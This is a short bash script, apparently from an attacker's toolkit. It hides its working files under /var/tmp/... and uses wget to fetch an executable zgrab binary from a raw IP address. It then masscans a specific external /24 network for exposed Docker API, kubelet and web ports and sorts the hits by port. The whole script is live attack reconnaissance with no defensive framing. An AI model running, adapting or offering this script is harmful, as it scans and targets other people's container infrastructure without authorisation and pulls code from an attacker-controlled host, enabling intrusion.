#!/bin/bash

WORKPATH="/var/tmp/..."
SRC_LINK="http://45.9.148.35/chimaera/bin"
#if [ -z "$RESFILE" ]; then read -p "file to sort: " RESFILE ; fi
if [ ! -d "$WORKPATH" ];then mkdir -p $WORKPATH ; fi
if [ ! -d "$WORKPATH/bin/" ];then mkdir -p $WORKPATH/bin/ ; fi

RESFILE=$WORKPATH"/results"


function setup_all(){
if [ ! -f "$WORKPATH/bin/zgrab" ];then wget $SRC_LINK/$(uname -m)/zgrab -O $WORKPATH/bin/zgrab ; chmod +x $WORKPATH/bin/zgrab ;fi

}


function scan_local(){
masscan -p2375,2376,4243,8080,8888,80,443,10250 203.154.91.0/24 >> $RESFILE
}

function sort_file(){
cat $RESFILE | grep ' 80/tcp ' >> $WORKPATH/80
cat $RESFILE | grep ' 443/tcp ' >> $WORKPATH/443
cat $RESFILE | grep ' 2375/tcp ' >> $WORKPATH/2375
cat $RESFILE | grep ' 2376/tcp ' >> $WORKPATH/2376
cat $RESFILE | grep ' 4040/tcp ' >> $WORKPATH/4040
cat $RESFILE | grep ' 4243/tcp ' >> $WORKPATH/4243
cat $RESFILE | grep ' 8080/tcp ' >> $WORKPATH/8080
cat $RESFILE | grep ' 8888/tcp ' >> $WORKPATH/8888
cat $RESFILE | grep ' 10250/tcp ' >> $WORKPATH/10250
rm -f $RESFILE

find $WORKPATH -size 0 -exec rm -f {} \;
}
